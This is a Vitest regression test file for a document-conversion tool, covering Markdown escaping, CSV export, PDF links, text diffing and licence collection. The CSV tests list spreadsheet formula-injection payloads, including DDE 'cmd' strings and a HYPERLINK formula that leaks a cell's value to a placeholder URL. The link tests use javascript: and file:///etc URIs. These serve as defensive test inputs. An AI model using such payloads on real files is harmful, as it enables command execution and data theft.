/**
 * Regression review of the 2026-09-25 conversion fixes (R-CONV-4..8,
 * R-BUILD-1). Each block pins the behaviour the review found broken:
 *
 *  • R-CONV-4 — the Markdown emphasis-bomb guard escaped `*`/`_`/`~` blindly,
 *    so code spans showed backslashes, autolinks and bare URLs broke, and
 *    `\*` became a literal backslash plus a live delimiter.
 *  • R-CONV-5 — the CSV formula guard prefixed an apostrophe (which a
 *    spreadsheet *displays*) on amounts, placeholders, phone numbers and
 *    @mentions.
 *  • R-CONV-6 — the deep-list note repeated once per item in any non-English
 *    locale.
 *  • R-CONV-7 — in-document `#anchor` links (Word TOC entries) were reported as
 *    refused, `tel:` was refused, and a refused link that wrapped counted twice.
 *  • R-CONV-8 — two quite different mid-size texts got the coarse diff.
 *  • R-BUILD-1 — THIRD_PARTY_LICENSES listed Node-only packages never shipped.
 */
import { afterEach, describe, expect, it, test } from 'vitest';
import { marked, type Token } from 'marked';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { PDFArray, PDFDict, PDFDocument, PDFName, PDFString } from 'pdf-lib';
import {
  escapePlainTextEmphasis,
  isInternalLink,
  literalEmphasisNote,
  markdownToPdfBytes,
  safeLinkUri
} from '../../src/core/markdown-to-pdf';
import { exportTableToCsv, neutralizeFormula } from '../../src/core/ocr/table-extract';
import {
  DEEP_LIST_NOTE_KEY,
  MAX_LIST_DEPTH,
  parseHtmlBlocks
} from '../../src/core/convert/html-to-pdf-blocks';
import { currentLocale, registerDictionary } from '../../src/core/i18n';
import { coarseDiff, diffText, MAX_LCS_CELLS, type DiffChunk } from '../../src/core/diff';
import {
  collectThirdPartyLicenses,
  packageOfModuleId
} from '../../scripts/third-party-licenses.mjs';

/** What marked produces from the guarded source: links (href), code spans, text. */
function lexGuarded(md: string): string[] {
  const out: string[] = [];
  const walk = (tokens: Token[]) => {
    for (const t of tokens) {
      if (t.type === 'link') out.push(`link:${t.href}`);
      else if (t.type === 'codespan') out.push(`code:${t.text}`);
      else if ('tokens' in t && t.tokens) walk(t.tokens);
      else if ('text' in t) out.push(`text:${t.text}`);
    }
  };
  walk(marked.Lexer.lexInline(escapePlainTextEmphasis(md).text));
  return out;
}

describe('R-CONV-4: the emphasis guard only escapes plain-text markers', () => {
  const blanks = 'Name: ' + '_'.repeat(520);

  it('leaves code spans, autolinks, bare URLs, link destinations and escapes as written', () => {
    const md =
      `${blanks} \`my_var_name\` <https://y.com/p_q> https://z.com/r_s ` +
      '[site](https://x.com/a_b~c) \\*literal\\* ``a `_` b``';
    const tokens = lexGuarded(md);
    expect(tokens).toContain('code:my_var_name');
    expect(tokens).toContain('code:a `_` b');
    expect(tokens).toContain('link:https://y.com/p_q');
    expect(tokens).toContain('link:https://z.com/r_s');
    expect(tokens).toContain('link:https://x.com/a_b~c');
    const text = tokens
      .filter(t => t.startsWith('text:'))
      .map(t => t.slice('text:'.length))
      .join('');
    expect(text).toContain('*literal*');
    expect(text).not.toContain('\\');
  });

  it('escapes every marker in plain text, and counts only those', () => {
    const { text, escaped } = escapePlainTextEmphasis('a *b* _c_ ~d~ `e_f` <mailto:x_y@z.io>');
    expect(escaped).toBe(6);
    expect(text).toBe('a \\*b\\* \\_c\\_ \\~d\\~ `e_f` <mailto:x_y@z.io>');
  });

  it('does not trigger the guard for markers that sit inside code', async () => {
    const code = '`' + '_'.repeat(600) + '`';
    const result = await markdownToPdfBytes(`Here: ${code}`);
    expect(result.notes).toEqual([]);
    const bomb = await markdownToPdfBytes(`${blanks} and \`snake_case\``);
    expect(bomb.notes).toContain(literalEmphasisNote(1));
  });

  it('stays linear on thousands of unmatched backticks of varying lengths', () => {
    const src = Array.from({ length: 20_000 }, (_, i) => '`'.repeat(1 + (i % 7)) + ' x').join(' ');
    const t = performance.now();
    escapePlainTextEmphasis(src);
    expect(performance.now() - t).toBeLessThan(1000);
  });
});

describe('R-CONV-5: formula neutralising only touches executable cells', () => {
  it.each([
    '-5%',
    '-12.5',
    '+3',
    '-1 234',
    '-$1,234.56',
    '-€5',
    '-5 USD',
    '-1.5e3',
    '(1,234)',
    '-',
    '- item',
    '+1 (555) 123-4567',
    '+44 20 7946 0958',
    '@john',
    '@john.doe',
    '- Tom & Jerry'
  ])('leaves %s as data', cell => {
    expect(neutralizeFormula(cell)).toBe(cell);
  });

  it.each([
    '=1+1',
    '=HYPERLINK("https://x/?"&A1,"Click")',
    "=cmd|' /C calc'!A0",
    "+cmd|' /C calc'!A0",
    '+1+cmd',
    '-2+3',
    '-2+3+cmd|x!A0',
    '@SUM(A1)',
    '@SUM(1+9)*cmd',
    '-A1',
    '+$B$2',
    '-Sheet1!A1',
    '-x=1',
    '\tfoo',
    '\rbar'
  ])('neutralises %s', cell => {
    expect(neutralizeFormula(cell)).toBe(`'${cell}`);
  });

  it('writes an amounts table to CSV with no apostrophes', () => {
    const grid = {
      rows: [
        ['Item', 'Amount'],
        ['Refund', '-$1,234.56'],
        ['Fee', '-']
      ],
      headers: ['Item', 'Amount'],
      rowCount: 3,
      columnCount: 2
    };
    expect(exportTableToCsv(grid)).toBe('Item,Amount\nRefund,"-$1,234.56"\nFee,-');
  });
});

describe('R-CONV-6: the deep-list note appears once in every locale', () => {
  afterEach(() => {
    currentLocale.value = 'en';
  });

  it('de-duplicates the translated note', () => {
    registerDictionary('de', {
      [DEEP_LIST_NOTE_KEY]: 'Eine Liste mit mehr als {depth} Ebenen wurde abgeflacht.'
    });
    currentLocale.value = 'de';
    let html = '';
    for (let level = 12; level >= 1; level--) html = `<ul><li>L${level}${html}</li></ul>`;
    // Two separate over-deep lists in one document: still one note.
    const { notes } = parseHtmlBlocks(html + html);
    expect(notes).toEqual([`Eine Liste mit mehr als ${MAX_LIST_DEPTH} Ebenen wurde abgeflacht.`]);
  });
});

async function linkUris(bytes: Uint8Array): Promise<string[]> {
  const doc = await PDFDocument.load(bytes);
  const out: string[] = [];
  for (const page of doc.getPages()) {
    const annots = page.node.lookupMaybe(PDFName.of('Annots'), PDFArray);
    if (!annots) continue;
    for (let i = 0; i < annots.size(); i++) {
      const uri = annots
        .lookup(i, PDFDict)
        .lookup(PDFName.of('A'), PDFDict)
        .lookup(PDFName.of('URI'));
      out.push(uri instanceof PDFString ? uri.asString() : String(uri));
    }
  }
  return out;
}

describe('R-CONV-7: in-document links, tel: links, and wrapped refusals', () => {
  it('recognises in-document links and allows tel:', () => {
    expect(isInternalLink('#_Toc123')).toBe(true);
    expect(isInternalLink(' #heading')).toBe(true);
    expect(isInternalLink('https://x.org/#a')).toBe(false);
    expect(safeLinkUri('tel:+1-555-123-4567')).toBe('tel:+1-555-123-4567');
  });

  it('draws #anchor links as text with no note, and makes tel: clickable', async () => {
    const result = await markdownToPdfBytes(
      '## Contents\n\n[Chapter one](#chapter-one) — call [us](tel:+15551234567).'
    );
    expect(result.notes).toEqual([]);
    expect(await linkUris(result.bytes)).toEqual(['tel:+15551234567']);
  });

  it('counts a refused link once even when it wraps over several lines', async () => {
    const longText = Array.from({ length: 60 }, (_, i) => `word${i}`).join(' ');
    const result = await markdownToPdfBytes(`[${longText}](javascript:alert(1))`);
    expect(result.notes.join(' ')).toMatch(/1 link was kept as plain text/);
  });

  it('counts a refused link once in the Word→PDF layout too, and ignores TOC anchors', async () => {
    const { layoutBlocksToPdf } = await import('../../src/core/convert/pdf-block-layout');
    const longText = Array.from({ length: 60 }, (_, i) => `word${i}`).join(' ');
    const { blocks } = parseHtmlBlocks(
      `<p><a href="#_Toc1">1. Introduction</a></p><p><a href="file:///etc/x">${longText}</a></p>`
    );
    const laid = await layoutBlocksToPdf(blocks, { pageSize: 'a4' });
    const linkNotes = laid.notes.filter(n => /kept as plain text/.test(n));
    expect(linkNotes).toHaveLength(1);
    expect(linkNotes[0]).toMatch(/^1 link was kept/);
  });
});

describe('R-CONV-8: moderately different texts still get a word-precise diff', () => {
  const rebuild = (chunks: DiffChunk[], side: 'old' | 'new') =>
    chunks.filter(c => c.op !== (side === 'old' ? 'insert' : 'delete')).map(c => c.text);

  /** Reference LCS length by the plain dynamic programme (small inputs only). */
  function lcsLength(a: string[], b: string[]): number {
    let prev = new Int32Array(b.length + 1);
    for (let i = 1; i <= a.length; i++) {
      const row = new Int32Array(b.length + 1);
      for (let j = 1; j <= b.length; j++) {
        row[j] = a[i - 1] === b[j - 1] ? prev[j - 1] + 1 : Math.max(prev[j], row[j - 1]);
      }
      prev = row;
    }
    return prev[b.length];
  }

  it('finds the optimal common subsequence of two different 3,500-word texts, fast', () => {
    const text = (step: number) => Array.from({ length: 3500 }, (_, i) => `w${(i * step) % 97}`);
    const a = text(3);
    const b = text(5);
    const t = performance.now();
    const chunks = diffText(a.join(' '), b.join(' '));
    expect(performance.now() - t).toBeLessThan(1500);
    expect(rebuild(chunks, 'old')).toEqual(a);
    expect(rebuild(chunks, 'new')).toEqual(b);
    const equal = chunks.filter(c => c.op === 'equal').length;
    expect(equal).toBe(lcsLength(a, b));
    expect(equal).toBeGreaterThan(700); // the coarse diff found 1
    expect(chunks).not.toEqual(coarseDiff(a, b));
  });

  it('is optimal on random mid-size inputs past the Myers budget', () => {
    let seed = 11;
    const rnd = () => (seed = (seed * 1103515245 + 12345) & 0x7fffffff) / 0x7fffffff;
    for (let run = 0; run < 3; run++) {
      const a = Array.from({ length: 2800 }, () => `t${Math.floor(rnd() * 40)}`);
      const b = Array.from({ length: 2900 }, () => `t${Math.floor(rnd() * 40)}`);
      const chunks = diffText(a.join(' '), b.join(' '));
      expect(rebuild(chunks, 'old')).toEqual(a);
      expect(rebuild(chunks, 'new')).toEqual(b);
      expect(chunks.filter(c => c.op === 'equal').length).toBe(lcsLength(a, b));
    }
  });

  it('keeps the coarse fallback past the LCS cell budget', () => {
    const side = Math.ceil(Math.sqrt(MAX_LCS_CELLS)) + 10;
    const a = Array.from({ length: side }, (_, i) => `a${i % 50}`);
    const b = Array.from({ length: side }, (_, i) => `b${i % 50}`);
    expect(diffText(a.join(' '), b.join(' '))).toEqual(coarseDiff(a, b));
  });
});

describe('R-BUILD-1: licence notices follow what the build ships', () => {
  let dir: string;
  afterEach(() => rmSync(dir, { recursive: true, force: true }));

  function pkg(at: string, json: Record<string, unknown>) {
    mkdirSync(at, { recursive: true });
    writeFileSync(path.join(at, 'package.json'), JSON.stringify(json));
  }

  test('keeps shipped packages and their regular dependencies, drops optional-only ones', () => {
    dir = mkdtempSync(path.join(tmpdir(), 'tpl-'));
    pkg(dir, { name: 'app', dependencies: { viewer: '1', cli: '1' } });
    pkg(path.join(dir, 'node_modules/viewer'), {
      name: 'viewer',
      version: '1.0.0',
      license: 'Apache-2.0',
      dependencies: { inlined: '1' },
      optionalDependencies: { 'native-canvas': '1' }
    });
    pkg(path.join(dir, 'node_modules/inlined'), {
      name: 'inlined',
      version: '1.0.0',
      license: 'MIT'
    });
    pkg(path.join(dir, 'node_modules/native-canvas'), {
      name: 'native-canvas',
      version: '1.0.0',
      license: 'MIT'
    });
    pkg(path.join(dir, 'node_modules/cli'), { name: 'cli', version: '1.0.0', license: 'MIT' });

    const all = collectThirdPartyLicenses(dir).map(e => e.name);
    expect(all).toEqual(['cli', 'inlined', 'native-canvas', 'viewer']);
    const shipped = collectThirdPartyLicenses(dir, { shipped: name => name === 'viewer' });
    expect(shipped.map(e => e.name)).toEqual(['inlined', 'viewer']);
  });

  test('names the package a bundled module id belongs to', () => {
    expect(
      packageOfModuleId('/r/node_modules/.pnpm/pdfjs-dist@6/node_modules/pdfjs-dist/build/pdf.mjs')
    ).toBe('pdfjs-dist');
    expect(packageOfModuleId('/r/node_modules/.pnpm/x/node_modules/@napi-rs/canvas/index.js')).toBe(
      '@napi-rs/canvas'
    );
    expect(packageOfModuleId('\0/r/node_modules/libheif-js/libheif.wasm?url&inline')).toBe(
      'libheif-js'
    );
    expect(packageOfModuleId('/r/src/core/image.ts')).toBeNull();
    expect(packageOfModuleId('C:\\r\\node_modules\\fflate\\esm\\index.mjs')).toBe('fflate');
  });
});
